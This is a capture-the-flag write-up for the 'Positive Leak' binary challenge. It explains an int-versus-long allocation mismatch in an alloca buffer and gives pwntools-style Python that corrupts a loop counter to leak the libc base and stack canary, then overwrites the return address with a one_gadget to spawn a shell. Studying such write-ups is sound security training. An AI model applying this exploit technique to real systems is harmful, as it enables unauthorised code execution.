# Positive Leak

**Category:** ROP

## Overview

```text
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

```C
void add_numbers(void)
{
    printf("How many would you add?");
    printf("> ");
    int size = get_int();

    long *tmp = alloca(size * sizeof(int));

    printf("#> ");
    long num = get_int();

    int i;
    for (i = 0; i < size && num >= 0; ++i)
    {
        tmp[i] = num;
        printf("[%d]#> ", i);
        num = get_int();
    }

    for (int j = 0; j <= i; ++j)
        numbers[j] += tmp[j];
}
```

The program has a global array called `numbers` of type `long` and with length 200.
The program has an `add_numbers` function and a `print_numbers` function that prints the content of the `numbers` array.


## Analysis

As we can see from the `add_numbers` function above, the vulnerability lies in the line `long *tmp = alloca(size * sizeof(int));`.
The buffer is allocated as an array of `int` (4 bytes each) but is indexed through a `long *` pointer (8 bytes each).
Each write therefore overflows by 4 bytes, so after `size` elements the buffer is overrun by `4 * size` bytes.



## Vulnerability
Type confusion in `tmp` (allocation size mismatch `int` vs `long`)


## Exploitation

First we have to leak the LIBC base address.
Using the overflow we can overwrite the counter, by placing `0x20ffffffff` on the counter; this will be set to `0x20`.
This has the effect of copying 32 longs of data from the stack into the global array, containing the LIBC base address and the canary (because numbers is initialized to 0).
Now we can use the `print_numbers` function to leak the two values.

```python
r.recvuntil(b"> ")
r.send(b"0")
r.recvuntil(b"would you add?> ")
r.send(b"6")
r.recvuntil(b"> ")
r.send(b"1")
r.recvuntil(b"> ")
r.send(b"1")
r.recvuntil(b"> ")
r.send(b"1")
r.recvuntil(b"> ")
r.send(b"1")
r.recvuntil(b"> ")
r.send(b"1")
r.recvuntil(b"> ")
r.send(bytes(str(0x20ffffffff),'utf-8'))
r.recvuntil(b"> ")
r.send(b"1")

#print_numbers call
r.recvuntil(b"> ")
r.send(b"1")
```

Now we pop a shell using a single gadget from onegadget.

Note that leaking the canary was not strictly necessary: because overwriting the counter gives us control over the write index, we can target the saved return address directly, skipping over the canary without corrupting it.

```python
LIBC.address = libc_base

off_onegadget = 0xef52b
addr_onegadget = LIBC.address + off_onegadget

#overwrite the saved_eip with the address on the libc of onegadget, we don't have to write the canary because we are manipulating the counter
# to write exactly into saved_eip -> the counter is before the canary

r.recvuntil(b"> ")
r.send(b"0")
r.recvuntil(b"would you add?> ")
r.send(b"21")

for _ in range(13):
    r.recvuntil(b"> ")
    r.send(b"0")

r.recvuntil(b"> ")
r.send(bytes(str(0x1200000000),'utf-8'))
print("Counter written")
r.recvuntil(b"> ")
r.send(bytes(str(addr_onegadget),'utf-8'))
print("Libc written")
r.recvuntil(b"> ")
r.send(b"-1") #exit from the cycle
```




 

